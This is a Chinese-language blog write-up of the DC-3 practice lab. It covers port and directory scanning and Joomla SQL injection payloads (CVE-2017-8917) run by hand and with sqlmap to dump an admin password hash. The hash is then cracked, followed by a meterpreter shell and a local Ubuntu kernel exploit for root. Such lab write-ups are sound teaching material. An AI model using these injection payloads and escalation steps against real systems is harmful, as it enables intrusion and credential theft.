---
title: DC3
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-16T01:01:44+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l 
目标机器ip ==> 192.168.121.146
```

开始信息收集

打开主页是一个登陆库框和几个功能按钮，先扫描一下端口和目录

```shell
Nmap scan report for 192.168.121.146 (192.168.121.146)
Host is up (0.00042s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:E9:F8:71 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
```

```
gobuster dir -u http://192.168.121.146 -w /usr/share/wordlists/dirb/common.txt
```

![dir](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\dir.png)

只有/administrator可以正常访问，访问发现是后台管理系统的登陆界面，使用的框架应该是Joomla,那就从框架入手，看看有没有能够利用的点

找到一个今年出的未授权漏洞，尝试利用失败，应该是版本没对上

```
http://127.0.0.1/api/index.php/v1/config/application?public=true
```

该漏洞要求4.0以上的版本，因此我们再看看有没有什么办法能够查询到版本，在测试漏洞的可利用性过程中发现了一个工具joomscan

```
perl joomscan.pl --url http://192.168.121.146
```

该工具能够识别版本，组件等等内容

![joomscan-1](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\joomscan-1.png)

最基础的，我们能够看到这里的版本信息，以及一些目录路径等等

识别组件还会给我们相应的漏洞,如下

```
perl joomscan.pl --url http://192.168.121.146 --ec
```

![joomscan-2](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\joomscan-2.png)

```
[++] Name: com_biblestudy                                                                                                                                                            
Location : http://192.168.121.146/components/com_biblestudy/                                                       Directory listing is enabled : http://192.168.121.146/components/com_biblestudy/                                                                                                     
[!] We found the component "com_biblestudy", but since the component version was not available we cannot ensure that it's vulnerable, please test it yourself.                       
Title : Joomla Component com_biblestudy 1.5.0 (id) SQL Injection Exploit                                                                                                             
Reference : https://www.exploit-db.com/exploits/5710                                                                                                                                 
[!] We found the component "com_biblestudy", but since the component version was not available we cannot ensure that it's vulnerable, please test it yourself.                       
Reference : http://www.cvedetails.com/cve/CVE-2018-7317                                                                                                                              
Reference : https://www.exploit-db.com/exploits/44159                                                                                                                                
Fixed in : 9.1.6                                                                                                                                                                     
[!] We found the component "com_biblestudy", but since the component version was not available we cannot ensure that it's vulnerable, please test it yourself.                       
Reference : http://www.cvedetails.com/cve/CVE-2018-7316                                                                                                                              
Reference : https://www.exploit-db.com/exploits/44164                                                                                                                                
Fixed in : 9.1.7    
```

给出漏洞和exp来源，我们可以选择影响较大的进行尝试，并且这个页面是文件泄露的地方，一般的字典应该跑不出这个目录，只能用对应的cms识别工具扫描，在这个页面翻看了一下，没有找到什么有价值的信息，那就开始尝试使用cve进行攻击

**cve-2017-8917**

根据介绍是一个sql injection，采用的方式是报错注入，

```
/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
```

如下，成功利用![xpath](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\xpath.png)

可以开始查询数据库等内容了，修改payload

```
updatexml(0x23,concat(1,database()),1) ==> joomladb
UpdateXML(2, concat(0x3a,(SELECT(HEX(TABLE_NAME))FROM(information_schema.tables) LIMIT 85,1),0x3a),1)
==>d8uea_content
UpdateXML(2,concat(0x3a,(SELECT(concat(COLUMN_NAME))FROM(information_schema.COLUMNS) WHERE TABLE_NAME LIKE 0x64387565615F636F6E74656E74 LIMIT 0,1),0x3a),1) 
==>id 
获取特定表的内容
UpdateXML(2,%20concat(0x3a,(SELECT(concat(id))FROM(d8uea_content)%20LIMIT%200,1),0x3a),1)
```

通过查询alias得到一个welcome,尝试登录失败，可能是表没有找对，重新爆破表名找到疑似表位于149,\#__users

但是在查询该表的列时遇到因为token问题而无法查询的问题

```
UpdateXML(2,concat(0x3a,(SELECT(concat(COLUMN_NAME))FROM(information_schema.COLUMNS) WHERE TABLE_NAME LIKE 0x235f5f7573657273 LIMIT 0,1),0x3a),1) 
```

手工注入注不出来，改用sqlmap试试

```
python sqlmap.py -u "http://192.168.121.146/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

可以正常注入，开始查询数据

```
python sqlmap.py  -u "http://192.168.121.146/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb -T "#__users" --dump
```

直接把表的内容脱下来，能够看到admin的密码邮箱

![admin](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\admin.png)

```
+-----+-------+--------------------------+--------------------------------------------------------------+----------+
| id  | name  | email                    | password                                                     | username |
+-----+-------+--------------------------+--------------------------------------------------------------+----------+
| 629 | admin | freddy@norealaddress.net | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
+-----+-------+--------------------------+--------------------------------------------------------------+----------
```

我们不能通过修改密码的页面修改admin的密码，只能另辟蹊径，很显然密码通过了hash加密，我的想法是去库里面找加密文件，或者是强行破解

有个#__user_keys表还没查过，但只使用common字典查不出来什么东西

再查一下#__bsms_admin，都查不出来什么就只能尝试爆破hash了

```
john password.txt
```

得到密码snoopy

![john](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\john.png)

成功登录后台

由于我之前尝试使用msf获取反向shell,给我的理由是没有administrator登录，因此没有返回shell,我们现在已经获取了admin账户，这样就能轻松获取低权限shell了

![low_hsell](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\low_hsell.png)

先用python尝试升级一个交互式shell,

```
meterpreter > shell
Process 19632 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@DC-3:/var/www/html/templates/beez3$ 
```

**系统漏洞提权**

在此之前，还是尝试了用一般命令进行提权，但是没有www的密码，无法执行sudo命令，网上的wp基本都是采用系统漏洞提权，借鉴一下

利用ubuntu16.04拒绝服务漏洞提权

```
searchspolit Ubuntu 16.04
cat /usr/share/exploitdb/exploits/linux/local/39772.txt
```

![zip](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\zip.png)

下载exp到本地

```
wget https://.....
```

解压

```
unzip 39772,zip
cd 39772
tar -xvf exploit.tar 
cd file_name
./compile.sh
./doublueput.c
./doubleput
即可提权root
```

![root](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\root.png)

在root目录下找到flag

![flag](E:\笔记软件\笔记\渗透测试\靶机练习\DC3图库\flag.png)

### 总结：

前期的渗透都还算顺利，当手注出不来的时候还是利用工具方便些，最大的问题还是提权，第一想法就是去利用命令提权，但是没办法直接执行sudo命令时，还要利用系统漏洞进行提权，算是打开了思路，慢慢总结来放到提权部分